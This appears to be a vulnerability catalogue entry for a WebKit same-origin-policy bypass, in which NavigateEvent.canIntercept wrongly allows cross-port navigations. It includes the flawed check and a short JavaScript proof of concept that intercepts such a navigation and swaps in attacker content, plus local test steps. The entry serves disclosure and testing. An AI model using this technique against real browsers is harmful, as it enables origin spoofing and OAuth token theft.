WebKit NavigateEvent.canIntercept SOP Bypass

ID: UXSS-SAFARI-01 CVE: CVE-2026-20643 Browsers: Safari (pre-26.3.1(a)), all iOS browsers Category: SOP Bypass / UXSS

Description

NavigateEvent.canIntercept incorrectly returns true for same-site but cross-port navigations. The interception gate accepts any HTTP-family target after a same-site check without verifying that scheme, host, and port all match.

This allows an attacker-controlled page to intercept or suppress navigations that should cross an origin boundary. Can be chained for UXSS or OAuth token theft.

Discovered by Thomas Espach. Fixed via Apple Background Security Improvements (BSI).

Technique (from public PoC by zeroxjf)

// Vulnerable code path: WebCore::Navigation::innerDispatchNavigateEvent // The flawed logic: // if (!isSameSite && !isSameOrigin) return false; // if (targetURL.protocolIsInHTTPFamily()) return true; // // Missing: port/host/scheme component equality check! // PoC: serve on port 8000, navigate to port 8800 // On vulnerable builds, NavigateEvent.canIntercept returns true // for cross-port (cross-origin) navigations navigation.addEventListener('navigate', (event) => { const destUrl = new URL(event.destination.url); // On vulnerable Safari: canIntercept is true even for different port if (event.canIntercept) { event.intercept({ handler() { // Attacker can now serve arbitrary content // while the address bar shows the target origin document.body.innerHTML = '<h1>Intercepted!</h1>'; } }); } });

Run Test

This test requires two ports. Best tested locally with python3 -m http.server 8000 and a service on port 8800.
